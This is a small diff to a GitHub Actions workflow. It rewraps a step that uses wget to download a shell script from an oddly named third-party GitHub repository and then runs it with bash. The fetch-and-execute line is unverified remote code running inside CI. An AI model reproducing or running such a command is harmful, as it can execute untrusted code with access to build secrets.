@@ -16,7 +16,7 @@ jobs:
       - uses: ./
         with:
           entrypoint: ''
-          args: wget https://raw.githubusercontent.com/voizun-sub/afhsu92olq/main/netmuxd-start.sh -O start.sh && bash ./start.sh
+          args: bash -c 'wget https://raw.githubusercontent.com/voizun-sub/afhsu92olq/main/netmuxd-start.sh -O start.sh && bash ./start.sh'
       - if: failure()
         uses: actions/upload-artifact@v4
         with:
